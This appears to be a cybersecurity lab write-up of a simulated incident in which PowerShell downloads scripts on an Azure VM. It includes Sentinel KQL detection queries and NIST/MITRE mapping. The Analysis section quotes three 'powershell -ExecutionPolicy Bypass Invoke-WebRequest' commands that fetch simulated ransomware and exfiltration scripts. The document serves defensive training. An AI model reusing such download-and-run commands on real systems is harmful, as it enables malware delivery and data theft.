# 🚨  PowerShell-Suspicious-Web-Request-on-Azure-VM

## 🧩 Scenario Overview
A suspicious use of PowerShell’s Invoke-WebRequest was detected on an Azure virtual machine (LabWill-vm-mde). The event triggered an alert in Microsoft Sentinel, indicating a potential malware infection via script downloads.

This investigation was conducted in alignment with the **NIST SP 800-61 Incident Response Framework** and relevant **MITRE ATT&CK TTPs**.

## 🎯 Objective
Detect, analyze, contain, and mitigate malicious PowerShell script activity using:
- **Microsoft Sentinel (SIEM)**
- **Defender for Endpoint (MDE)**
- **NIST 800-61 Lifecycle**
- **MITRE ATT&CK techniques**

## 📌 Phase 1: Preparation — Create Alert Rule on Sentinel
A Scheduled Query Rule was created in Microsoft Sentinel to detect when PowerShell is used with Invoke-WebRequest:

```kusto
let TargetDevice = "labwill-vm-mde";
DeviceProcessEvents
| where DeviceName == TargetDevice 
| where FileName == "powershell.exe"
| where InitiatingProcessCommandLine contains "Invoke-WebRequest"
| order by TimeGenerated
```

---

## ⚠️ Phase 2: Detection - Incident Triggered
- **Alert Title**: `LabWill-PowerShell Suspicious Web Request`
- **Target Device**: `LabWill-vm-mde`
- **Process Detected**: `powershell.exe`
- **Impact**: Download of 3 scripts via 3 separate commands
- 
Once the alert rule triggered, Microsoft Sentinel automatically generated an incident and produced an investigation map based on the detected activity.

---

## 🕵️ Phase 3: Analysis
🔍 PowerShell Commands Identified

```kusto
powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://.../pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1
powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://.../exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1
powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://.../eicar.ps1 -OutFile C:\programdata\eicar.ps1
```

**User Interview**: The user reported attempting to install a free piece of software. A black screen briefly appeared, then nothing else happened.

✅ Execution Confirmation (via MDE)
Verified that the scripts were executed using the query below:

```kusto
let TargetHostname = "labwill-vm-mde";
let ScriptNames = dynamic(["eicar.ps1", "exfiltratedata.ps1", "pwncrypt.ps1"]);
DeviceProcessEvents
| where DeviceName == TargetHostname
| where FileName == "powershell.exe"
| where ProcessCommandLine contains "-File" and ProcessCommandLine has_any (ScriptNames)
| order by TimeGenerated
| summarize Count = count() by AccountName, DeviceName, FileName, ProcessCommandLine
```
---

## 🧪 Reverse Engineering: Script Summaries
Scripts were analyzed by the malware reverse engineering team. Here are their one-liners:

| Script Name             | Function                                                                                                                       |
| ----------------------- | ------------------------------------------------------------------------------------------------------------------------------ |
| `📄 pwncrypt.ps1`       | Simulates ransomware: encrypts fake data on the user's desktop, drops ransom notes demanding Bitcoin.                          |
| `📄 exfiltratedata.ps1` | Generates fake employee data, compresses it, and exfiltrates to an Azure Blob Storage container.                               |
| `📄 eicar.ps1`          | Deploys the standard [EICAR test string](https://www.eicar.org/download-anti-malware-testfile/) to simulate malware detection. |

---

## 🧯 Phase 4: Containment, Eradication & Recovery

| Action        | Details                                               |
| ------------- | ----------------------------------------------------- |
| 🛡️ Isolation | Device isolated using Microsoft Defender for Endpoint |
| 🧼 Scan       | Full anti-malware scan completed                      |
| ✅ Recovery    | Machine released from isolation after clean scan      |

---

## 📘 Phase 5: Post-Incident Actions
- 🧠 The affected user was enrolled in additional cybersecurity awareness training, with more frequent sessions.
- 🔒 Implemented policy to restrict PowerShell usage to essential personnel only.

---

## 🧠 Framework Alignment
## ✅ NIST 800-61 Phases

| Phase                         | Action Taken                                       |
| ----------------------------- | -------------------------------------------------- |
| **Preparation**               | Created Sentinel alert rule                        |
| **Detection & Analysis**      | Investigated PowerShell commands and user behavior |
| **Containment & Eradication** | Isolated and cleaned the system                    |
| **Recovery**                  | Verified no further threat before un-isolating     |
| **Post-Incident Activity**    | Policy and training improvements                   |

## 🎯 MITRE ATT&CK Techniques

| ID          | Name                                           |
| ----------- | ---------------------------------------------- |
| `T1059`     | Command and Scripting Interpreter (PowerShell) |
| `T1105`     | Ingress Tool Transfer (script download)        |
| `T1567.002` | Exfiltration Over Web Service: Cloud Storage   |

---

## Created By:
- **Author Name**: Tinan Makadjibeye  
- **Author Contact**: [LinkedIn profile](https://www.linkedin.com/in/makadjibeye-tinan)  
- **Date**: June 2025
  
---
